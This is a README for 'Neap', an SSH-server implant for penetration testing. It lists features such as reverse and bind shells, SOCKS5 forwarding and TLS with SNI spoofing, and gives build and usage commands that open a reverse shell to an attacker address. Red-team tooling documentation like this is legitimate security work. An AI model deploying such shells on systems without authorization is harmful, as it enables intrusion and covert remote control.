# Neap

Statically-linked SSH server for authorized penetration testing.

Reverse shells, bind shells, SFTP file transfer, and full SSH port forwarding in a single static binary.

Rust rewrite of [Undertow](https://github.com/Real-Fruit-Snacks/Undertow).

## Features

- Reverse shell (dial home to attacker)
- Bind shell (listen for connections)
- Full PTY support (Linux + Windows ConPTY)
- SFTP file transfer
- Local, remote, and dynamic (SOCKS5) port forwarding
- TLS wrapping with SNI spoofing
- Password + public key authentication
- Build-time configuration
- Single static binary under 2MB

## Build

```bash
# Current platform
make current

# Using build.sh (recommended)
./build.sh reverse 192.168.1.10:4444
./build.sh listen 8888
./build.sh reverse 10.10.14.5:443 --tls --password "secret"

# All targets (requires cross-compilation toolchains)
make build

# With UPX compression
make compressed
```

## Usage

```bash
# Bind mode
neap -l -p 4444

# Reverse mode
neap 192.168.1.10
neap -p 31337 kali@192.168.1.10

# Verbose
neap -v -l -p 4444
```

## License

GPLv3
